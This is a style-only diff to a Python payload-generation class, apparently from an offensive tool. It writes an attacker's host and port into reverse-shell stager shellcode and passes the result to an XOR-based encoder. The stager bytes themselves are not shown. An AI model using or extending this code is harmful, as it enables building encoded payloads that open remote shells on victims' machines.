@@ -8,6 +8,7 @@ from .xor import *
 
 
 class PayloadModule:
+
     def __init__(self, lhost, lport):
         self.lport = int(lport)
         self.lhost = lhost  
@@ -41,7 +42,7 @@ class PayloadModule:
         ip_shellcode = ''
         n = 2
         ip_shellcode_stage = binascii.hexlify(socket.inet_aton(self.lhost))
-        ip_shellcode_stage = [ip_shellcode_stage[i:i+n] for i in range(0, len(ip_shellcode_stage), n)]
+        ip_shellcode_stage = [ip_shellcode_stage[i:i + n] for i in range(0, len(ip_shellcode_stage), n)]
         for two_bytes in ip_shellcode_stage:
             ip_shellcode += '\\x' + two_bytes
 
@@ -82,7 +83,7 @@ class PayloadModule:
         stager_shellcode += port_shellcode.decode('string-escape')
         stager_shellcode += self.stager[self.lport_offset + 2:]
 
-        self.customized_shellcode = "\\x" + '\\x'.join(stager_shellcode.encode('hex')[i:i+2] for i in range(0, len(stager_shellcode.encode('hex')), 2))
+        self.customized_shellcode = "\\x" + '\\x'.join(stager_shellcode.encode('hex')[i:i + 2] for i in range(0, len(stager_shellcode.encode('hex')), 2))
         return EncoderModule(self.customized_shellcode).do_the_magic()
-        
+
 
